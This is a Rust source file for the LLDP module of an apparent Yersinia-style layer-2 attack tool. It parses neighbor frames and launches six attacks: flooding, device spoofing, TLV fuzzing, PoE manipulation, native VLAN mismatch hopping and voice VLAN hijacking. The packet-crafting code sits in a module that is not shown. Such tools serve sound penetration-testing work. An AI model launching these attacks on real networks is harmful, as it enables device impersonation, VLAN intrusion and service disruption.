//! LLDP Protocol Implementation
//!
//! Implements the Protocol trait for Link Layer Discovery Protocol with full support
//! for packet parsing, statistics tracking, and attack launching.

use async_trait::async_trait;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::SystemTime;
use tokio::sync::RwLock;
use yersinia_core::{
    protocol::{AttackParams, Protocol, ProtocolStats},
    Attack, AttackContext, AttackDescriptor, AttackHandle, AttackId, AttackStatsCounters, Error,
    Interface, Packet, Parameter, ProtocolId, Result,
};

use super::attack::{
    LldpFloodingAttack, LldpFuzzingAttack, LldpNativeVlanMismatchAttack, LldpPoeManipulationAttack,
    LldpSpoofingAttack, LldpVoiceVlanHijackingAttack,
};
use super::packet::LldpPacket;

/// LLDP Protocol Implementation
pub struct LldpProtocol {
    stats: Arc<RwLock<ProtocolStats>>,
    discovered_neighbors: Arc<RwLock<HashMap<String, LldpNeighborInfo>>>,
}

/// Information about a discovered LLDP neighbor
#[derive(Debug, Clone)]
struct LldpNeighborInfo {
    chassis_id: String,
    port_id: String,
    _system_name: Option<String>,
    _system_description: Option<String>,
    _capabilities: Option<u16>,
    _last_seen: SystemTime,
}

impl LldpProtocol {
    pub fn new() -> Self {
        Self {
            stats: Arc::new(RwLock::new(ProtocolStats::default())),
            discovered_neighbors: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Extract neighbor information from LLDP packet
    fn extract_neighbor_info(&self, packet: &LldpPacket) -> Option<LldpNeighborInfo> {
        let chassis_id = packet
            .get_chassis_id()
            .map(hex::encode)
            .or_else(|| Some("unknown".to_string()))?;

        let port_id = packet
            .tlvs
            .iter()
            .find(|tlv| matches!(tlv.tlv_type, super::packet::LldpTlvType::PortId))
            .and_then(|tlv| String::from_utf8(tlv.value.clone()).ok())
            .unwrap_or_else(|| "unknown".to_string());

        let system_name = packet.get_system_name();

        let system_description = packet
            .tlvs
            .iter()
            .find(|tlv| matches!(tlv.tlv_type, super::packet::LldpTlvType::SystemDescription))
            .and_then(|tlv| String::from_utf8(tlv.value.clone()).ok());

        let capabilities = packet
            .tlvs
            .iter()
            .find(|tlv| matches!(tlv.tlv_type, super::packet::LldpTlvType::SystemCapabilities))
            .and_then(|tlv| {
                if tlv.value.len() >= 2 {
                    Some(u16::from_be_bytes([tlv.value[0], tlv.value[1]]))
                } else {
                    None
                }
            });

        Some(LldpNeighborInfo {
            chassis_id,
            port_id,
            _system_name: system_name,
            _system_description: system_description,
            _capabilities: capabilities,
            _last_seen: SystemTime::now(),
        })
    }
}

impl Default for LldpProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Protocol for LldpProtocol {
    fn name(&self) -> &'static str {
        "Link Layer Discovery Protocol"
    }

    fn shortname(&self) -> &'static str {
        "lldp"
    }

    fn id(&self) -> ProtocolId {
        ProtocolId::LLDP
    }

    fn attacks(&self) -> &[AttackDescriptor] {
        static ATTACKS: [AttackDescriptor; 6] = [
            AttackDescriptor {
                id: AttackId(0),
                name: "LLDP Flooding",
                description: "Flood the network with LLDP packets to exhaust neighbor table",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(1),
                name: "LLDP Device Spoofing",
                description: "Impersonate a network device using LLDP",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(2),
                name: "LLDP TLV Fuzzing",
                description: "Send malformed LLDP TLVs to test device robustness",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(3),
                name: "LLDP PoE Manipulation",
                description: "Manipulate Power over Ethernet allocation and priorities",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(4),
                name: "LLDP Native VLAN Mismatch",
                description: "Exploit native VLAN mismatch for VLAN hopping",
                parameters: vec![],
            },
            AttackDescriptor {
                id: AttackId(5),
                name: "LLDP Voice VLAN Hijacking",
                description: "Gain access to voice VLAN by spoofing as VoIP device",
                parameters: vec![],
            },
        ];

        &ATTACKS
    }

    fn parameters(&self) -> Vec<Box<dyn Parameter>> {
        vec![]
    }

    fn handle_packet(&mut self, packet: &Packet) -> Result<()> {
        let mut stats = self
            .stats
            .try_write()
            .map_err(|_| Error::protocol("Failed to acquire stats lock"))?;

        stats.packets_received += 1;
        stats.bytes_received += packet.data.len() as u64;

        // LLDP packets are: Ethernet (14 bytes) + LLDP payload
        // Ethertype is 0x88CC for LLDP
        if packet.data.len() > 14 {
            // Check ethertype (bytes 12-13)
            if packet.data[12] == 0x88 && packet.data[13] == 0xCC {
                let lldp_data = &packet.data[14..];
                match LldpPacket::from_bytes(lldp_data) {
                    Some(lldp_packet) => {
                        stats.packets_parsed += 1;

                        if let Some(neighbor_info) = self.extract_neighbor_info(&lldp_packet) {
                            drop(stats);

                            let mut neighbors = self
                                .discovered_neighbors
                                .try_write()
                                .map_err(|_| Error::protocol("Failed to acquire neighbors lock"))?;

                            let key =
                                format!("{}:{}", neighbor_info.chassis_id, neighbor_info.port_id);
                            neighbors.insert(key, neighbor_info);

                            let mut stats = self
                                .stats
                                .try_write()
                                .map_err(|_| Error::protocol("Failed to acquire stats lock"))?;

                            stats
                                .custom
                                .insert("discovered_neighbors".to_string(), neighbors.len() as u64);
                        }
                    }
                    None => {
                        stats.packets_errors += 1;
                    }
                }
            } else {
                stats.packets_errors += 1;
            }
        } else {
            stats.packets_errors += 1;
        }

        Ok(())
    }

    async fn launch_attack(
        &self,
        attack_id: AttackId,
        params: AttackParams,
        interface: &Interface,
    ) -> Result<AttackHandle> {
        match attack_id.0 {
            // LLDP Flooding Attack
            0 => {
                let system_name_prefix = params
                    .get_string("system_name_prefix")
                    .unwrap_or("yersinia")
                    .to_string();

                let interval_ms = params.get_u32("interval_ms").unwrap_or(100);

                let count = params.get_u32("count").map(|c| c as u64);

                let randomize_mac = params.get_bool("randomize_mac").unwrap_or(true);

                let mut attack = LldpFloodingAttack::new(system_name_prefix, interval_ms);
                attack.count = count;
                attack.randomize_mac = randomize_mac;

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "Flooding".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            // LLDP Device Spoofing Attack
            1 => {
                let chassis_id_str = params
                    .get_string("chassis_id")
                    .ok_or_else(|| Error::protocol("chassis_id parameter required"))?;

                let chassis_id = parse_mac(chassis_id_str)
                    .ok_or_else(|| Error::protocol("Invalid chassis_id format"))?;

                let port_id = params
                    .get_string("port_id")
                    .ok_or_else(|| Error::protocol("port_id parameter required"))?
                    .to_string();

                let system_name = params
                    .get_string("system_name")
                    .ok_or_else(|| Error::protocol("system_name parameter required"))?
                    .to_string();

                let system_description = params
                    .get_string("system_description")
                    .unwrap_or("Yersinia LLDP")
                    .to_string();

                let port_description = params
                    .get_string("port_description")
                    .unwrap_or("eth0")
                    .to_string();

                let capabilities = params.get_u32("capabilities").unwrap_or(0x14) as u16; // Bridge + Router

                let ttl = params.get_u32("ttl").unwrap_or(120) as u16;

                let interval_ms = params.get_u32("interval_ms").unwrap_or(30000);

                let mut attack = LldpSpoofingAttack::new(chassis_id, port_id, system_name);
                attack.system_description = system_description;
                attack.port_description = port_description;
                attack.capabilities = capabilities;
                attack.enabled_capabilities = capabilities;
                attack.ttl = ttl;
                attack.interval_ms = interval_ms;

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "Device Spoofing".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            // LLDP TLV Fuzzing Attack
            2 => {
                let tlv_type = params.get_u32("tlv_type").map(|v| v as u8);

                let tlv_length = params.get_u32("tlv_length").map(|v| v as u16);

                let interval_ms = params.get_u32("interval_ms").unwrap_or(100);

                let mut attack = LldpFuzzingAttack::new();
                attack.tlv_type = tlv_type;
                attack.tlv_length = tlv_length;
                attack.interval_ms = interval_ms;

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "TLV Fuzzing".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            // LLDP PoE Manipulation Attack
            3 => {
                let chassis_id_str = params
                    .get_string("chassis_id")
                    .ok_or_else(|| Error::protocol("chassis_id parameter required"))?;

                let chassis_id = parse_mac(chassis_id_str)
                    .ok_or_else(|| Error::protocol("Invalid chassis_id format"))?;

                let power_request_mw = params.get_u32("power_mw").unwrap_or(15400);

                let attack = LldpPoeManipulationAttack::new(chassis_id, power_request_mw);

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = yersinia_core::AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "PoE Manipulation".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            // LLDP Native VLAN Mismatch Attack
            4 => {
                let chassis_id_str = params
                    .get_string("chassis_id")
                    .ok_or_else(|| Error::protocol("chassis_id parameter required"))?;

                let chassis_id = parse_mac(chassis_id_str)
                    .ok_or_else(|| Error::protocol("Invalid chassis_id format"))?;

                let advertised_native_vlan = params.get_u32("native_vlan").unwrap_or(1) as u16;

                let attack = LldpNativeVlanMismatchAttack::new(chassis_id, advertised_native_vlan);

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = yersinia_core::AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "Native VLAN Mismatch".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            // LLDP Voice VLAN Hijacking Attack
            5 => {
                let chassis_id_str = params
                    .get_string("chassis_id")
                    .ok_or_else(|| Error::protocol("chassis_id parameter required"))?;

                let chassis_id = parse_mac(chassis_id_str)
                    .ok_or_else(|| Error::protocol("Invalid chassis_id format"))?;

                let voice_vlan = params.get_u32("voice_vlan").unwrap_or(100) as u16;

                let attack = LldpVoiceVlanHijackingAttack::new(chassis_id, voice_vlan);

                let running = Arc::new(std::sync::atomic::AtomicBool::new(true));
                let paused = Arc::new(std::sync::atomic::AtomicBool::new(false));
                let stats = Arc::new(AttackStatsCounters::default());

                let ctx = yersinia_core::AttackContext {
                    interface: interface.clone(),
                    running: running.clone(),
                    paused: paused.clone(),
                    stats: stats.clone(),
                };

                let task_handle = tokio::spawn(async move { attack.execute(ctx).await });

                Ok(AttackHandle {
                    id: uuid::Uuid::now_v7(),
                    protocol: "LLDP".to_string(),
                    attack_name: "Voice VLAN Hijacking".to_string(),
                    running,
                    paused,
                    stats,
                    started_at: SystemTime::now(),
                    task_handle: Some(task_handle),
                })
            }

            _ => Err(Error::protocol("Invalid attack ID")),
        }
    }

    fn stats(&self) -> ProtocolStats {
        self.stats.try_read().map(|s| s.clone()).unwrap_or_default()
    }

    fn reset_stats(&mut self) {
        if let Ok(mut stats) = self.stats.try_write() {
            *stats = ProtocolStats::default();
        }

        if let Ok(mut neighbors) = self.discovered_neighbors.try_write() {
            neighbors.clear();
        }
    }
}

/// Parse MAC address from string (format: 00:11:22:33:44:55)
fn parse_mac(mac_str: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac_str.split(':').collect();
    if parts.len() != 6 {
        return None;
    }

    let mut mac = [0u8; 6];
    for (i, part) in parts.iter().enumerate() {
        mac[i] = u8::from_str_radix(part, 16).ok()?;
    }

    Some(mac)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_protocol_metadata() {
        let lldp = LldpProtocol::new();
        assert_eq!(lldp.name(), "Link Layer Discovery Protocol");
        assert_eq!(lldp.shortname(), "lldp");
        assert_eq!(lldp.attacks().len(), 6);
    }

    #[test]
    fn test_parse_mac() {
        let mac = parse_mac("00:11:22:33:44:55");
        assert_eq!(mac, Some([0x00, 0x11, 0x22, 0x33, 0x44, 0x55]));

        let invalid = parse_mac("invalid");
        assert_eq!(invalid, None);
    }
}
